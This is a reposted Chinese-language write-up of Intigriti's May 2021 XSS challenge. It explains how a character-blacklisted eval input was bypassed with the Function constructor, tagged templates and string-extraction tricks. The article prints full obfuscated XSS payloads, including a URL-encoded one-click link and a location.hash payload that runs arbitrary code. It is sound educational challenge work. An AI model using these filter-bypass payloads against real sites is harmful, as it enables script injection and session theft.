@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <title>Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼 – 觀點2 – 高頻版 git.io/JUJZT</title>
+
+      <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="
+Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼
+——
+" />
+    <meta property="og:description" content="
+Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼
+——
+" />
+    
+    <meta name="author" content="觀點2" />
+
+    
+    <meta property="og:title" content="Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼" />
+    <meta property="twitter:title" content="Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼" />
+    
+
+  <link rel="stylesheet" type="text/css" href="/oped2/style.css" />
+  <link rel="alternate" type="application/rss+xml" title="觀點2 - 高頻版 git.io/JUJZT" href="/oped2/feed.xml" />
+
+  <!-- Social Share Kit CSS -->
+  <link rel="stylesheet" href="/oped2/assets/css/social-share-kit.css" type="text/css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
+  <script type="text/javascript" src="/oped2/assets/js/page.js"></script>
+
+</head>
+
+  <body>
+    <div class="wrapper-masthead">
+  <div class="container">
+    <header class="masthead clearfix">
+      
+
+      <div class="site-info">
+        <h1 class="site-name" style="display: inline-block;"><a href="/oped2/">觀點2</a></h1>
+        <i class="site-description" style="font-size: 12px;">高頻版 git.io/JUJZT</i>
+      </div>
+
+      <nav>
+        <span id="search-container" >
+          <a href="/oped2/tools"><i class="fa fa-bookmark twitter" title="百宝箱"></i></a>
+        <a><i class="fa fa-search" title="限前100結果"></i></a><input type="text" id="search-input" placeholder="標題 作者 來源 日期 (5200)"
+          style="margin: 10px 0px 0px 0px; height: 30px;width: auto" title="本站最正確的打開方式">
+        </span>
+        
+        
+        <a href="/oped2/categories" style="color: Tomato;"><i class="fa fa-tags" title="分类"></i></a>
+        
+        
+        
+        <a href="https://be4.herokuapp.com/" style="color: #003366;"><i class="fa fa-comments" title="论坛"></i></a>
+        
+        
+        
+        <a href="/oped2/about"><i class="fa fa-info-circle" title="关于"></i></a>
+        
+        
+        <a title="电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇，del同来源旧一篇" onclick="toggle_visibility('help')"><i class="fa fa-question-circle"></i></a>
+        <a id="fa-home" href="https://nodebe4.github.io" title="BE4服务列表" onclick="//toggle_visibility('site-list')"><i class="fa fa-home" aria-hidden="true"></i></a>
+      </nav>
+
+    </header>
+    <div id="site-list" class="tags" style="display: block;text-align: right;border-bottom: 1px solid lightGray;"></div>
+    <p id="help" style="font-size: 14px;display: none;text-align: right;"><span style="color:green;">电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇, del同来源旧一篇</span>; <span style="color:orange">对应触屏FAB：上下右左</span>; 轉Markdown<a href="https://euangoddard.github.io/clipboard2markdown/"><i class="fa fa-file-text-o"></i></a></p>
+  </div>
+</div>
+
+<script type="text/javascript" >
+  function toggle_visibility(id){
+    var help = document.getElementById(id)
+    if (help.style.display=='none'){
+      help.style.display='block';
+    }else{
+      help.style.display='none';
+    }
+  }
+
+  const url = "https://nodebe4.github.io/sitelist.json"
+
+  document.addEventListener("DOMContentLoaded", function(event){
+    // var homebtn = document.getElementById("fa-home")
+    // homebtn.removeAttribute("href")
+    var content = document.getElementById("site-list");
+    content.innerHTML = ''
+    var ul = document.createElement("ul")
+    ul.classList.add("label")
+    content.appendChild(ul)
+    var cnt = 0
+
+    $.getJSON(url, function(allsites) {
+
+      allsites.map(item =>{
+        var li = document.createElement('li')
+        li.classList.add("tag")
+        li.id = 'site-' + cnt
+        ul.appendChild(li)
+        var a0 = document.createElement('a')
+        li.appendChild(a0)
+        a0.href = item.url[0]
+        var span = document.createElement('span')
+        a0.appendChild(span)
+        span.innerText = item['name']
+        // span.style.backgroundColor = item['background-color']
+        // span.style.color='#E4CBC3'
+        span.style.color = item['background-color']
+        span.style['font-size'] = '14px'
+        cnt += 1
+        // test_alive(li.id, a0.href)
+      })
+    })
+  })
+
+function test_alive(id, url){
+  var divstatus = document.getElementById(id)
+  const base = 'https://textance.herokuapp.com/title/'
+  var fullurl = base + url
+  $.ajax({
+      url: fullurl,
+      complete: function(data) {
+        if (data.responseText.includes('502')){
+          // divstatus.style.color='#FBB7B7'
+          // divstatus.style.color='gray'
+          // divstatus.title = "服务器无响应"
+          divstatus.parentNode.removeChild(divstatus)
+        }else{
+          // divstatus.style.color='#B6FAC8'
+          divstatus.title = data.responseText
+        }
+      }
+  });
+  return divstatus
+}
+</script>
+
+    <!-- Left & centered positioning -->
+
+<div class="ssk-sticky ssk-right ssk-center ssk-sticky-hide-xs ssk-group ssk-round">
+  
+    <a href="https://be4news.pythonanywhere.com/archivenow/ia/https%3A%2F%2Fmedium.com%2Fcymetrics%2Fintigritis-0521-xss-challenge-writeup-b859a65acc48%3Fsource%3Drss-f1fb3e40dc37------2" class="ssk ssk-link" title="存到互联网档案馆" target="_blank"></a>
+    <a href="https://www.facebook.com/sharer.php?u=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2" class="ssk ssk-facebook"></a>
+    <a href="https://twitter.com/intent/tweet?url=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2&text=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼&hashtags=觀點2" class="ssk ssk-twitter"></a>
+    <a href="https://reddit.com/submit?url=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2&title=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼" class="ssk ssk-reddit"></a>
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2&title=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼" class="ssk ssk-linkedin"></a>
+    <a href="mailto:{email_address}?subject=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼&body=
+Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼
+——
+" class="ssk ssk-email"></a>
+    <a href="http://pinterest.com/pin/create/link/?url=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2" class="ssk ssk-pinterest"></a>
+    <a href="https://www.tumblr.com/widgets/share/tool?canonicalUrl=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2&title=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼&caption=
+Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼
+——
+&tags=觀點2" class="ssk ssk-tumblr"></a>
+    <a href="https://buffer.com/add?text=Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼&url=https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2" class="ssk ssk-buffer"></a>
+</div>
+
+
+    <div id="main" role="main" class="container">
+      
+  <!-- Html Elements for Search -->
+  <ul id="results-container" class="searched" style="color: #2980B9;"></ul>
+
+  <script src="/oped2/assets/js/simple-jekyll-search.min.js"></script>
+
+  <!-- Configuration -->
+  <script>
+  SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('results-container'),
+    json: '/oped2/search.json',
+    searchResultTemplate: '<li><a href="{url}" title="{desc}">{title}</a><time>{date}</time><a class="tag">{category}</a></li>',
+    noResultsText: '没找到',
+    limit: 100,
+    fuzzy: false,
+    exclude: ['Welcome']
+  })
+
+  </script>
+
+      
+
+
+
+
+
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+    
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+    
+
+
+
+<article class="post">
+  <h1>Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</h1>
+  <!-- Look the author details up from the site config. -->
+  
+
+  <div>
+    <span class="date">
+      2021-06-07
+    </span>
+
+    <!-- Output author details if some exist. -->
+    
+      
+        <span>
+            <!-- Personal Info. -->
+            <a  style="font-size:14px;">作者: Huli</a>
+        </span>
+      
+    
+
+
+    <ul class="tag">
+      <li>
+        <a href="https://nodebe4.github.io/oped2/categories/#medium">
+          medium
+        </a>
+      </li>
+    </ul>
+
+    
+        <span>
+            <!-- Personal Info. -->
+            <a href="https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2" style="font-size:14px;">原文</a>
+        </span>
+    
+
+    <span style="float: right;" title="medium的其它文章">
+      <a style="font-size: 14px;" rel="nofollow" href="#sametag" class="tags">#medium 的其它文章</a>
+    </span>
+
+  </div>
+
+  <div class="entry">
+    
+    
+    
+    <!--1623072849000-->
+<p><a href="https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48?source=rss-f1fb3e40dc37------2">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a>
+——</p>
+
+<div>
+  <p><a href="https://www.intigriti.com/">Intigriti</a> 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 alert(document.domain) ，解出來之後把結果透過 Intigriti 平台回報，最後會隨機抽 3 個解掉的人得到他們自己商店的優惠券。</p>
+  <p>上個月的挑戰因為解出來的人不多，所以我有幸運抽到 50 歐元的優惠券，其實很划算，因為商店賣的東西其實都滿便宜的，我買了一件 t-shirt + 兩頂帽子再加國際運費，大概 45 歐元左右。</p>
+  <p>不過這種獎品就是靠運氣啦，還是解題好玩比較重要。</p>
+  <p>挑戰網址在這邊： <a href="https://challenge-0521.intigriti.io/">https://challenge-0521.intigriti.io/</a></p>
+  <figure>
+<img alt="" src="https://cdn-images-1.medium.com/max/937/0*PWzGDbO1b8eyAan5.png" />    <figcaption>
+挑戰截圖
+    </figcaption>
+  </figure>
+  <h3 id="section">程式碼分析</h3>
+  <p>解題的第一步就是分析一下它的程式碼，先了解一下這整個題目的運作為何。首頁這一頁看起來沒什麼東西，比較值得注意的只有一個網址是 ./captcha.php 的 iframe，直接來看看裡面是什麼：</p>
+  <iframe src="" width="0" height="0" frameborder="0" scrolling="no">
+<a href="https://medium.com/media/7618560fe09b79239fd4c2eb69ef76e1/href">https://medium.com/media/7618560fe09b79239fd4c2eb69ef76e1/href</a>
+  </iframe>
+  <p>這邊有幾個 input，然後使用者按下送出時會把輸入的 c.value 丟到 eval 去執行，但有限定字元，不能使用： a-df-z&lt;&gt;()!\='" ，在英文字母裡面只有 e 是可以用的。</p>
+  <p>因此這題的目標就很明顯了，是要繞過這個字元的限制，然後透過那個 eval 幫我們執行 alert(document.domain)</p>
+  <h3 id="section-1">全面啟動</h3>
+  <p>有關繞過字元限制，之前我有寫了一篇： <a href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a> ，沒想到這次就派上用場了。</p>
+  <p>舉例來說， 0/0 可以產生 NaN，所以 `${0/0}`[1] 就可以拿到字元 a。只要用類似的技巧，應該就可以產生出我們想要的所有字元。</p>
+  <p>但這題難的地方我覺得不在這，而是一開始在思考這題的時候腦袋容易打結，因為會分不太清楚什麼程式碼會直接被執行，什麼程式碼又不會。</p>
+  <p>舉例來說，就算費盡千辛萬苦拼出了目標字串好了，丟到 eval 去之後其實結果跟你想像中不太一樣，因為結構大概會像這樣： eval('"a"+"l"+"e"+"r"+"t"+"(1)"')</p>
+  <p>最後的結果會是字串： alert(1) ，而不是直接執行 alert(1)，因為你在做的只是把想執行的程式碼拼出來，而 eval 只是幫你拼起來而已。那如果再把 eval 拼出來呢？</p>
+  <p>eval('"eval(a"+"l"+"e"+"r"+"t"+"(1))"'</p>
+  <p>這樣也是沒用的，也只會出現字串的 eval 而已。之所以這樣不行，是因為你拼的東西是字串中的字串。舉例來說，請看下面這兩段程式碼：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eval('alert(1)')eval('"alert(1)"')</code></pre></div>  </div>
+  <p>前者會跳出 alert，後者會輸出字串 alert。這就是因為後者是：「字串中的字串」。如果用字串拼接的方式，就一定會這樣。</p>
+  <p>所以如果需要執行程式碼的話，我們一定要有一些東西是不需要拼接的，在 JS 裡面可以把字串當作程式碼執行的有：</p>
+  <ol>
+    <li>eval</li>
+    <li>function constructor</li>
+    <li>setTimeout</li>
+    <li>setInterval</li>
+    <li>location</li>
+  </ol>
+  <p>這裡面符合我們需求的，就是 function constructor 了！</p>
+  <p>為什麼這樣說呢？因為我們可以不直接透過字串存取到這個東西！先簡單講一下 function constructor，就是 Function() 這個東西，可以動態產生函式。</p>
+  <p>然後 Function 就是 Function.prototype.constructor，所以可以利用 prototype chain 加上陣列來存取到：</p>
+  <p>[]['constructor']['constructor'] === Function // true</p>
+  <p>有了這個之後，就可以動態建立 function 並且執行了！</p>
+  <p>像這樣：[]['constructor']['constructor']('alert(1)')()</p>
+  <p>那為什麼這樣子放進 eval 之後就可以呢？因為 [] 並不是用字串組成的，所以放進 eval 會是這樣： eval("[]['constructor']['constructor']('alert(1)')()")</p>
+  <p>這樣一來，就可以在 eval 裡面透過 function constructor 去動態執行程式碼了，這就是這個章節的標題「全面啟動」的意思，一層還有一層。</p>
+  <p>不過除了要找出替代字串以外，還有一個問題，那就是函式呼叫不能使用 () ，這該怎麼辦呢？</p>
+  <h3 id="tagged-templates">Tagged templates</h3>
+  <p>有用過 React 中的 styled components 的話，對這個語法應該不陌生：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const Box = styled.div`  background: red;`</code></pre></div>  </div>
+  <p>其實 styled.div 是一個 function，然後用反引號來呼叫 function。沒錯，反引號也是可以呼叫函式的，但要注意的是參數的傳遞會跟你想的不太一樣。</p>
+  <p>直接做個簡單示範就知道了：</p>
+  <iframe src="" width="0" height="0" frameborder="0" scrolling="no">
+<a href="https://medium.com/media/f9fabec3395c14206008e4bad820a8ec/href">https://medium.com/media/f9fabec3395c14206008e4bad820a8ec/href</a>
+  </iframe>
+  <p>用反引號來呼叫函式的話，第一個參數會是一個陣列，裡面是所有一般的字串，隔開的標準是中間有 ${}，而接下來第二個參數以後都是你放在 ${} 裡的內容。</p>
+  <p>更多範例可參考：<a href="https://pjchender.blogspot.com/2017/01/javascript-es6-template-literalstagged.html">[筆記] JavaScript ES6 中的模版字符串（template literals）和標籤模版（tagged template）</a></p>
+  <p>把我們上面的程式碼用反引號改寫會變這樣：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[]['constructor']['constructor']`${'alert(1)'}```</code></pre></div>  </div>
+  <p>但這樣的話如果你丟去執行，會發現有錯。因為根據我們上面所說的，這樣寫的話傳去 function constructor 的參數會是：[""], 'alert(1)' ，第一個參數是一個含有空字串的陣列。</p>
+  <p>而 function constructor 除了最後一個參數之外，其他都會被當作要動態新增的函式的參數，例如說 Function('a', 'b', 'return a+b') 就是：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function (a, b) {  return a+b}</code></pre></div>  </div>
+  <p>所以第一個參數給空字串是行不通的，加一個變數就行了，例如說題目允許的 e 或者是 _：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[]['constructor']['constructor']`_${'alert(1)'}``｀// 產生出的函式function anonymous(_,) {  alert(1)}</code></pre></div>  </div>
+  <p>這樣就能順利執行程式碼了，因此最後剩下的就只有拼出 constructor 跟 alert(document.domain) 了</p>
+  <h3 id="section-2">字串拼拼樂</h3>
+  <p>除了我開頭提到的文章： <a href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a>之外， <a href="https://github.com/aemkei/jsfuck/blob/master/jsfuck.js">jsfuck</a> 的程式碼也有很多可以參考的地方。</p>
+  <p>底下是我用的幾個：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. `${``+{}}` =&gt; "[object Object]"2. `${``[0]}` =&gt; "undefined"3. `${e}` =&gt; "[object HTMLProgressElement]"4. `${0/0}` =&gt; "NaN"</code></pre></div>  </div>
+  <p>我們可以從上面這些組合中，找到所有需要的字元。接下來只差最後兩個了，就是 () ，我們必須也用拼的拼出這兩個字元才行。</p>
+  <p>這要怎麼拿到呢？在 JS 裡面把 function 變成字串的話，就會是整個 function 的內容，像這樣：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`${[]['constructor']}`=&gt; "function Array() { [native code] }"</code></pre></div>  </div>
+  <p>可以透過這樣子拿到這裡面的 () 這兩個字元。</p>
+  <p>結合以上的技巧，我自己寫了一個簡單的小程式去產出最終的結果：</p>
+  <iframe src="" width="0" height="0" frameborder="0" scrolling="no">
+<a href="https://medium.com/media/686378085d3621abb2e7f82ef1e243ed/href">https://medium.com/media/686378085d3621abb2e7f82ef1e243ed/href</a>
+  </iframe>
+  <p>output(長度 851):</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${``+{}}`[6]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${``[0]}`[2]+`${``+{}}`[1]+`${``+{}}`[5]+`${``[0]}`[0]+`${e}`[23]+`e`+`${``[0]}`[1]+`${``+{}}`[6]+`.`+`${``[0]}`[2]+`${``+{}}`[1]+`${e}`[23]+`${0/0}`[1]+`${``[0]}`[5]+`${``[0]}`[1]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</code></pre></div>  </div>
+  <p>把上面這整串貼到網頁上的 input 然後按下提交，就會看到 alert 跳出來囉！</p>
+  <figure>
+<img alt="" src="https://cdn-images-1.medium.com/max/903/0*ztgfHdjYQDJnAxUK.png" />
+  </figure>
+  <p>做到這邊之後我就很開心地去送答案，結果得到了一個回覆，跟我說這是 self-XSS，提示我說可以多往 php 那邊去研究一點。</p>
+  <p>沒錯，我都忘記這是一個 self-XSS 了，因為需要自己把這串 payload 貼在 input 上面送出，就有點像是使用者必須自己把惡意程式碼貼過來一樣，這種通常沒辦法構成具有嚴重性的漏洞。</p>
+  <p>因此我就往 PHP 那邊去看，隨便試了一下發現 c=xxx 的內容會直接反映在 c.value 上，所以只要把上面那一串放到網址上面去就好了，變成：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${``%2b{}}`[6]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${``[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${``[0]}`[1]%2b`${``%2b{}}`[6]%2b`.`%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}```</code></pre></div>  </div>
+  <p>這樣子使用者點了網址之後 payload 就會自動填好，只要按按鈕就可以觸發。於是我們把 self-XSS 變成了 one-click XSS，點個按鈕就會中招。</p>
+  <p>做到這邊其實就通過這題了，但因為還有時間，所以我還想再研究更多東西。</p>
+  <h3 id="section-3">執行任意程式碼</h3>
+  <p>只是執行固定的程式碼不太好玩，有沒有可能執行任意程式碼？像是這種任意程式碼執行通常都會透過幾個方法把程式碼帶進去，例如說：</p>
+  <ol>
+    <li>window.name</li>
+    <li>iframe + top.name</li>
+    <li>location.hash</li>
+  </ol>
+  <p>這邊前兩者都需要自己再做另一個網頁，只有 location.hash 不需要，因此這邊就先以這個作法為主吧！</p>
+  <p>我們需要湊出的字串是：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[]['constructor']['constructor']`_${'eval(location.hash.slice(1))'}```</code></pre></div>  </div>
+  <p>這樣只要讓網址最後面是：#alert(document.domain) ，就可以達成一樣的效果了。</p>
+  <p>新的字元組合，缺少的只有兩個：v 跟 h。</p>
+  <p>這兩個其實不太好找，因為比較好找的已經都被我們找完了。那還有哪裡可以找呢？</p>
+  <p>首先是 v 的部分，其實可以把原生的 function 變成 string，就能拿到 [native code] 這個字串。但是在 Chrome 上與 Firefox 上的輸出不太一樣，以 RegExp 為例，</p>
+  <p>Chrome 的輸出是： function RegExp() { [native code] }<br />Firefox 的輸出是： function RegExp() {\n [native code]\n}</p>
+  <p>Firefox 的輸出會換行而 Chrome 不會，這就造成了字元 index 的差異，所以沒辦法跨瀏覽器取得 v 這個字。不過我們先不管這個，先來看 h 好了。</p>
+  <p>h 一樣也是不容易取得，但如果我們能組出： 17['toString']`36` ，其實就能拿到 h。</p>
+  <p>因為上面的程式碼就是把 17 這個數字轉成 36 進位，這樣就可以拿到 h，因為 h 是第 8 個英文字母（9 個數字 + 第 8 個英文字母 = 17）。</p>
+  <p>那這個大寫的 S 怎麼拿呢？String constructor 可以拿到：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>``['constructor'] + ''// output// "function String() { [native code] }"</code></pre></div>  </div>
+  <p>而且一旦我們可以用 toString 的這個技巧，其實任何小寫英文字母都可以拿到了，當然也包含前面所說的 v。</p>
+  <p>詳細過程我就不示範了，把程式改一下就好，最後的結果是（1925 個字）：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`e`+31[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[21]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${e}`[21]+`${``+{}}`[1]+`${``+{}}`[5]+`${0/0}`[1]+`${``+{}}`[6]+`${``[0]}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`.`+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[18]+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`.`+`${e}`[18]+`${e}`[21]+`${``[0]}`[5]+`${``+{}}`[5]+`e`+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+1+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</code></pre></div>  </div>
+  <h3 id="section-4">挑戰最短程式碼</h3>
+  <p>可以執行任意程式碼之後，還有什麼可以玩呢？那就是挑戰最短的程式碼！試著把程式碼弄到最短看看。</p>
+  <p>可以想到的有：</p>
+  <p>1.不要用 ``[0]拿到 undefined，而是用 e[0]，可以省一個字元<br />2. ``+{} 來拿 [object Object] 其實多此一舉，用 {} 就好，省了三個字<br />3. 有可以用到 e 的地方盡量用到 e，因為程式碼會最少</p>
+  <p>再來我們本來是用 []['constructor'] 來拿到 function，這樣有點太長了，可以用很科學的方式來找出最短的：</p>
+  <iframe src="" width="0" height="0" frameborder="0" scrolling="no">
+<a href="https://medium.com/media/cf728fcc5c1a0fff813f01e2d62e749e/href">https://medium.com/media/cf728fcc5c1a0fff813f01e2d62e749e/href</a>
+  </iframe>
+  <p>找出來的冠軍是 some，可以拿來取代本來使用的 []['constructor'] 。</p>
